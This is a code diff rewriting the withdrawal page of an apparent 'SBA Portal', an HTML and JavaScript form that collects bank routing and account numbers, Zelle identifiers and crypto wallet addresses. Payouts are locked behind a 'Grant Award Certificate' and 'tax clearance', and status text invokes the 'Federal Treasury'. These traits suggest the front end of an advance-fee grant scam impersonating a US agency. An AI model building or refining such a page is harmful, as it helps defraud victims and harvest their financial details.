@@ -1,212 +1,189 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" data-theme="light">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Withdraw Funds | SBA Portal</title>
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
     <link rel="stylesheet" href="global.css">
     <style>
-        .method-tabs { display: flex; gap: 8px; margin-bottom: 24px; background: var(--surface-2); padding: 4px; border-radius: var(--r-md); }
-        .method-tab { flex: 1; padding: 10px; border: none; background: none; border-radius: var(--r-sm); font-size: 0.85rem; font-weight: 700; color: var(--text-muted); cursor: pointer; transition: var(--t-fast); font-family: var(--font); }
-        .method-tab.active { background: var(--white); color: var(--navy); box-shadow: var(--shadow-sm); }
-        .withdraw-pane { display: none; animation: fadeSlide 0.3s ease; }
-        .withdraw-pane.active { display: block; }
+        .method-tab { display: none; animation: fadeSlide 0.3s ease; }
+        .method-tab.active { display: block; }
+        .balance-hero { background: var(--navy); color: white; padding: 32px; border-radius: var(--r-xl); text-align: center; margin-bottom: 32px; box-shadow: var(--shadow-navy); }
+        .balance-hero__val { font-size: 2.8rem; font-weight: 900; letter-spacing: -0.02em; margin: 8px 0; }
+        .balance-hero__label { font-size: 0.8rem; text-transform: uppercase; opacity: 0.7; font-weight: 700; letter-spacing: 0.1em; }
+        
+        .tab-btn { flex: 1; padding: 12px; font-size: 0.85rem; border-bottom: 2px solid transparent; color: var(--text-muted); cursor: pointer; background: none; border: none; font-weight: 700; transition: 0.2s; }
+        .tab-btn.active { color: var(--navy); border-bottom-color: var(--navy); }
     </style>
 </head>
 <body>
-    <div id="pageLoader" class="page-loader active"><div class="spinner"></div></div>
-
-    <div class="app-layout">
-        <aside class="app-sidebar" id="appSidebar"></aside>
-        <div class="app-sidebar__overlay" id="sidebarOverlay"></div>
-
-        <main class="app-main">
-            <header class="page-header" id="pageHeader"></header>
-
-            <div class="app-main__content" style="max-width: 600px;">
-                <div id="withdrawTarget"></div>
+<div id="pageLoader" class="page-loader active"><div class="spinner"></div></div>
+<div class="app-layout">
+    <aside class="app-sidebar" id="appSidebar"></aside>
+    <main class="app-main">
+        <div id="pageHeader"></div>
+        <div class="app-main__content" style="max-width: 800px;">
+            
+            <div id="lockedView" class="status-screen" style="display:none;">
+                <div class="status-screen__icon status-screen__icon--info"><i class="fa-solid fa-lock"></i></div>
+                <h1 class="status-screen__title">Withdrawal Locked</h1>
+                <p class="status-screen__message">Payouts are only enabled after your Grant Award Certificate has been issued and tax clearance is finalized.</p>
+                <a href="award.html" class="btn btn--primary">View Award Status</a>
             </div>
-        </main>
-    </div>
 
-    <script type="module">
-        import { db, serverTimestamp, updateUserData, addLedgerEntry, notify, notifyAdmins } from './firebase-config.js';
-        import { requireAuth, buildSidebar, buildPageHeader, initTheme, initNotificationBadge, setButtonLoading, showToast, formatCurrency, showConfirm } from './app.js';
+            <div id="statusView" class="status-screen" style="display:none;">
+                <div id="stIcon" class="status-screen__icon"></div>
+                <h1 id="stTitle" class="status-screen__title"></h1>
+                <p id="stMsg" class="status-screen__message"></p>
+                <div id="stActions"></div>
+            </div>
 
-        requireAuth((user, userData) => {
-            initTheme();
-            buildSidebar({ activeId: 'withdraw', userData });
-            buildPageHeader({ title: 'Withdraw Funds', subtitle: 'Secure Federal Disbursement', backUrl: 'dashboard.html' });
-            initNotificationBadge(user.uid);
+            <div id="withdrawForm" style="display:none;">
+                <div class="balance-hero">
+                    <div class="balance-hero__label">Available for Withdrawal</div>
+                    <div class="balance-hero__val" id="displayBal">$0.00</div>
+                    <div class="badge badge--success" style="background:rgba(255,255,255,0.1); color:white;">Verified Funds</div>
+                </div>
 
-            const target = document.getElementById('withdrawTarget');
-
-            if (userData.awardStatus !== 'APPROVED') {
-                target.innerHTML = `
-                    <div class="status-screen card">
-                        <div class="status-screen__icon status-screen__icon--info"><i class="fa-solid fa-lock"></i></div>
-                        <h2 class="status-screen__title">Step Locked</h2>
-                        <p class="status-screen__message">Withdrawal is only enabled once your Grant Award has been officially issued and tax requirements are cleared.</p>
-                        <a href="dashboard.html" class="btn btn--secondary">Back to Dashboard</a>
-                    </div>
-                `;
-                return;
-            }
-
-            if (userData.withdrawStatus === 'PENDING') {
-                target.innerHTML = `
-                    <div class="status-screen card">
-                        <div class="status-screen__icon status-screen__icon--pending"><i class="fa-solid fa-money-bill-transfer"></i></div>
-                        <h2 class="status-screen__title">Transfer Pending</h2>
-                        <p class="status-screen__message">Your withdrawal request for ${formatCurrency(userData.withdrawal?.amount || 0)} is being processed by the Treasury department. Expected completion: 1-3 business days.</p>
-                    </div>
-                `;
-            } else if (userData.withdrawStatus === 'REJECTED') {
-                target.innerHTML = `
-                    <div class="status-screen card">
-                        <div class="status-screen__icon status-screen__icon--error"><i class="fa-solid fa-triangle-exclamation"></i></div>
-                        <h2 class="status-screen__title">Request Declined</h2>
-                        <p class="status-screen__message">Reason: ${userData.withdrawal?.declineReason || 'Invalid details.'}</p>
-                        <button class="btn btn--primary" id="btnRetryWithdraw">Submit New Request</button>
-                    </div>
-                `;
-                document.getElementById('btnRetryWithdraw').onclick = async () => {
-                    await updateUserData(user.uid, { withdrawStatus: 'IDLE' });
-                    window.location.reload();
-                };
-            } else {
-                renderWithdrawForm(user, userData, target);
-            }
-        });
-
-        function renderWithdrawForm(user, userData, target) {
-            target.innerHTML = `
-                <div class="card">
-                    <div style="background:var(--navy); color:white; padding:24px; border-radius:var(--r-lg); margin-bottom:28px; text-align:center;">
-                        <div style="font-size:0.75rem; opacity:0.8; text-transform:uppercase; font-weight:700; margin-bottom:4px;">Available for Withdrawal</div>
-                        <div style="font-size:2.2rem; font-weight:900;">${formatCurrency(userData.balance)}</div>
+                <div class="card mb-8">
+                    <div class="flex border-bottom mb-6">
+                        <button class="tab-btn active" data-m="bank">Bank Transfer</button>
+                        <button class="tab-btn" data-m="zelle">Zelle</button>
+                        <button class="tab-btn" data-m="crypto">Crypto</button>
                     </div>
 
-                    <div class="method-tabs">
-                        <button class="method-tab active" data-target="bank">Bank Wire</button>
-                        <button class="method-tab" data-target="zelle">Zelle</button>
-                        <button class="method-tab" data-target="crypto">Crypto</button>
-                    </div>
-
-                    <form id="withdrawForm">
-                        <div id="pane-bank" class="withdraw-pane active">
-                            <div class="form-group"><label class="form-label">Bank Name</label><input type="text" id="w-bankName" class="form-input" placeholder="e.g. Chase Bank"></div>
-                            <div class="form-group"><label class="form-label">Routing Number</label><input type="text" id="w-routing" class="form-input" maxlength="9" placeholder="9-digit code"></div>
-                            <div class="form-group"><label class="form-label">Account Number</label><input type="text" id="w-account" class="form-input"></div>
-                            <div class="form-group"><label class="form-label">Account Type</label><select id="w-type" class="form-select"><option>Checking</option><option>Savings</option></select></div>
+                    <form id="wForm">
+                        <!-- Bank -->
+                        <div id="m-bank" class="method-tab active">
+                            <div class="form-group"><label class="form-label">Bank Name</label><input type="text" id="w-bank-name" class="form-input" placeholder="e.g. Chase Bank"></div>
+                            <div class="form-row">
+                                <div class="form-group"><label class="form-label">Routing Number</label><input type="text" id="w-bank-route" class="form-input" maxlength="9"></div>
+                                <div class="form-group"><label class="form-label">Account Number</label><input type="text" id="w-bank-acc" class="form-input"></div>
+                            </div>
                         </div>
 
-                        <div id="pane-zelle" class="withdraw-pane">
-                            <div class="form-group"><label class="form-label">Zelle Contact (Email/Phone)</label><input type="text" id="w-zelle" class="form-input" placeholder="name@email.com"></div>
+                        <!-- Zelle -->
+                        <div id="m-zelle" class="method-tab">
+                            <div class="form-group"><label class="form-label">Zelle Email or Phone</label><input type="text" id="w-zelle-id" class="form-input" placeholder="identifier@email.com"></div>
+                            <div class="form-group"><label class="form-label">Recipient Full Name</label><input type="text" id="w-zelle-name" class="form-input"></div>
                         </div>
 
-                        <div id="pane-crypto" class="withdraw-pane">
-                            <div class="form-group"><label class="form-label">Select Coin</label><select id="w-coin" class="form-select"><option>USDT (TRC20)</option><option>Bitcoin</option><option>Ethereum</option></select></div>
-                            <div class="form-group"><label class="form-label">Your Wallet Address</label><input type="text" id="w-cryptoAddress" class="form-input" placeholder="Paste address carefully"></div>
+                        <!-- Crypto -->
+                        <div id="m-crypto" class="method-tab">
+                            <div class="form-row">
+                                <div class="form-group"><label class="form-label">Coin</label><select id="w-coin" class="form-select"><option value="BTC">Bitcoin (BTC)</option><option value="USDT">USDT</option><option value="ETH">Ethereum (ETH)</option></select></div>
+                                <div class="form-group"><label class="form-label">Network</label><select id="w-net" class="form-select"><option value="BTC">Bitcoin</option><option value="ERC20">ERC20</option><option value="TRC20">TRC20</option></select></div>
+                            </div>
+                            <div class="form-group"><label class="form-label">Your Wallet Address</label><input type="text" id="w-addr" class="form-input" placeholder="Enter your destination address"></div>
                         </div>
 
-                        <hr style="margin:24px 0; border:none; border-top:1px solid var(--border-light);">
-
-                        <div class="form-group">
-                            <label class="form-label">Withdrawal Amount (USD)</label>
-                            <input type="number" id="w-amount" class="form-input" max="${userData.balance}" placeholder="0.00">
+                        <div class="form-group mt-6">
+                            <label class="form-label">Amount to Withdraw (USD)</label>
+                            <input type="number" id="w-amt" class="form-input" style="font-size:1.5rem; font-weight:800; color:var(--navy);" placeholder="0.00">
+                            <p class="form-hint" id="maxHint">Maximum: $0.00</p>
                         </div>
 
-                        <div class="form-group">
-                            <label class="form-label">Transaction PIN</label>
-                            <input type="password" id="w-pin" class="form-input" maxlength="4" placeholder="••••">
+                        <div style="background:var(--bg); padding:20px; border-radius:var(--r-lg); margin:24px 0;">
+                            <div class="form-group mb-0">
+                                <label class="form-label"><i class="fa-solid fa-shield-halved"></i> Transaction PIN</label>
+                                <input type="password" id="w-pin" class="form-input text-center" maxlength="4" placeholder="••••" style="letter-spacing:1em; font-size:1.2rem;">
+                            </div>
                         </div>
 
-                        <button type="submit" class="btn btn--primary btn--full btn--lg mt-4" id="btnSubmitWithdraw">Submit Withdrawal Request</button>
+                        <button type="submit" class="btn btn--primary btn--full btn--lg" id="btnSubmit">Request Withdrawal</button>
                     </form>
                 </div>
-            `;
+            </div>
+        </div>
+    </main>
+</div>
 
-            // Tab logic
-            let currentMethod = 'bank';
-            document.querySelectorAll('.method-tab').forEach(tab => {
-                tab.onclick = () => {
-                    document.querySelectorAll('.method-tab').forEach(t => t.classList.remove('active'));
-                    document.querySelectorAll('.withdraw-pane').forEach(p => p.classList.remove('active'));
-                    tab.classList.add('active');
-                    currentMethod = tab.dataset.target;
-                    document.getElementById(`pane-${currentMethod}`).classList.add('active');
-                };
-            });
+<script type="module">
+    import { updateUserData, addLedgerEntry, notify, notifyAdmins, serverTimestamp, increment } from './firebase-config.js';
+    import { requireAuth, buildSidebar, buildDock, buildPageHeader, initNotificationBadge, showToast, setButtonLoading, formatCurrency, showConfirm } from './app.js';
 
-            document.getElementById('withdrawForm').onsubmit = async (e) => {
-                e.preventDefault();
-                const amount = parseFloat(document.getElementById('w-amount').value);
-                const pin = document.getElementById('w-pin').value;
+    requireAuth((user, userData) => {
+        buildSidebar({ activeId: 'withdraw', userData });
+        buildDock({ activeId: 'home' });
+        buildPageHeader({ title: 'Withdraw Funds', subtitle: 'Secure Treasury Transfer', backUrl: 'dashboard.html' });
+        initNotificationBadge(user.uid);
 
-                if (!amount || amount <= 0) return showToast('Enter valid amount', 'warning');
-                if (amount > userData.balance) return showToast('Insufficient balance', 'error');
-                if (pin !== userData.transactionPin) return showToast('Invalid Transaction PIN', 'error');
+        const bal = userData.balance || 0;
+        document.getElementById('displayBal').textContent = formatCurrency(bal);
+        document.getElementById('maxHint').textContent = `Maximum: ${formatCurrency(bal)}`;
 
-                showConfirm({
-                    title: 'Confirm Withdrawal',
-                    message: `You are requesting to withdraw ${formatCurrency(amount)} via ${currentMethod.toUpperCase()}. This process is irreversible once approved.`,
-                    danger: true,
-                    confirmText: 'Submit Request',
-                    onConfirm: async () => {
-                        const btn = document.getElementById('btnSubmitWithdraw');
-                        setButtonLoading(btn, true);
-
-                        const withdrawalData = {
-                            method: currentMethod,
-                            amount: amount,
-                            submittedAt: serverTimestamp(),
-                            // Gather all potentially filled fields
-                            bankName: document.getElementById('w-bankName').value,
-                            routingNumber: document.getElementById('w-routing').value,
-                            accountNumber: document.getElementById('w-account').value,
-                            accountType: document.getElementById('w-type').value,
-                            zelleContact: document.getElementById('w-zelle').value,
-                            cryptoCoin: document.getElementById('w-coin').value,
-                            cryptoAddress: document.getElementById('w-cryptoAddress').value
-                        };
-
-                        try {
-                            await updateUserData(user.uid, {
-                                balance: userData.balance - amount,
-                                withdrawStatus: 'PENDING',
-                                withdrawal: withdrawalData
-                            });
-                            await addLedgerEntry(user.uid, {
-                                type: 'withdrawal',
-                                amount: amount,
-                                description: `Withdrawal Requested (${currentMethod})`,
-                                status: 'PENDING'
-                            });
-                            await notify(user.uid, {
-                                title: 'Withdrawal Requested',
-                                message: `Your request for ${formatCurrency(amount)} is under review.`,
-                                type: 'info',
-                                sendEmail: true
-                            });
-                            await notifyAdmins({
-                                title: 'New Withdrawal',
-                                message: `${userData.fullName} requested ${formatCurrency(amount)} via ${currentMethod}`,
-                                type: 'action'
-                            });
-                            showToast('Request submitted', 'success');
-                            window.location.reload();
-                        } catch (err) {
-                            setButtonLoading(btn, false);
-                            showToast('Request failed', 'error');
-                        }
-                    }
-                });
-            };
+        if(userData.awardStatus !== 'APPROVED') {
+            document.getElementById('lockedView').style.display = 'block';
+        } else if(userData.withdrawStatus === 'IDLE') {
+            document.getElementById('withdrawForm').style.display = 'block';
+        } else {
+            const statusView = document.getElementById('statusView');
+            statusView.style.display = 'block';
+            const ic = document.getElementById('stIcon');
+            if(userData.withdrawStatus === 'PENDING') {
+                ic.className = 'status-screen__icon status-screen__icon--info'; ic.innerHTML = '<i class="fa-solid fa-money-bill-transfer fa-bounce"></i>';
+                document.getElementById('stTitle').textContent = 'Transfer Pending';
+                document.getElementById('stMsg').textContent = 'Your withdrawal request is being processed by the Federal Treasury. Funds typically arrive within 1-3 business days.';
+            } else if(userData.withdrawStatus === 'REJECTED') {
+                ic.className = 'status-screen__icon status-screen__icon--error'; ic.innerHTML = '<i class="fa-solid fa-circle-xmark"></i>';
+                document.getElementById('stTitle').textContent = 'Transfer Declined';
+                document.getElementById('stMsg').textContent = userData.withdrawal?.declineReason || 'Security validation failed.';
+                document.getElementById('stActions').innerHTML = '<button class="btn btn--outline" id="btnRetry">Try New Method</button>';
+                document.getElementById('btnRetry').onclick = () => updateUserData(user.uid, { withdrawStatus: 'IDLE' }).then(()=>location.reload());
+            }
         }
-    </script>
+
+        let method = 'bank';
+        document.querySelectorAll('.tab-btn').forEach(btn => {
+            btn.onclick = () => {
+                document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+                document.querySelectorAll('.method-tab').forEach(t => t.classList.remove('active'));
+                btn.classList.add('active');
+                method = btn.dataset.m;
+                document.getElementById('m-'+method).classList.add('active');
+            };
+        });
+
+        document.getElementById('wForm').onsubmit = async (e) => {
+            e.preventDefault();
+            const amt = parseFloat(document.getElementById('w-amt').value);
+            const pin = document.getElementById('w-pin').value;
+
+            if(amt > bal) return showToast('Insufficient balance', 'error');
+            if(amt < 100) return showToast('Minimum withdrawal is $100', 'warning');
+            if(pin !== userData.transactionPin) return showToast('Incorrect security PIN', 'error');
+
+            showConfirm({
+                title: 'Confirm Withdrawal',
+                message: `You are about to transfer ${formatCurrency(amt)} via ${method.toUpperCase()}. This action is permanent.`,
+                confirmText: 'Confirm Payout',
+                danger: true,
+                onConfirm: async () => {
+                    const btn = document.getElementById('btnSubmit');
+                    setButtonLoading(btn, true);
+                    const payload = {
+                        method, amount: amt, submittedAt: serverTimestamp(),
+                        bankName: document.getElementById('w-bank-name').value,
+                        accountNumber: document.getElementById('w-bank-acc').value,
+                        routingNumber: document.getElementById('w-bank-route').value,
+                        zelleId: document.getElementById('w-zelle-id').value,
+                        cryptoAddr: document.getElementById('w-addr').value
+                    };
+
+                    try {
+                        await updateUserData(user.uid, { withdrawal: payload, withdrawStatus: 'PENDING', balance: increment(-amt) });
+                        await addLedgerEntry(user.uid, { type:'withdrawal', amount: -amt, description: `Withdrawal — ${method.toUpperCase()}`, status: 'PENDING' });
+                        await notifyAdmins({ title:'Withdrawal Request', message:`${userData.fullName} requested ${formatCurrency(amt)}`, type:'action' });
+                        location.reload();
+                    } catch(err) {
+                        showToast(err.message, 'error');
+                        setButtonLoading(btn, false);
+                    }
+                }
+            });
+        };
+    });
+</script>
 </body>
 </html>
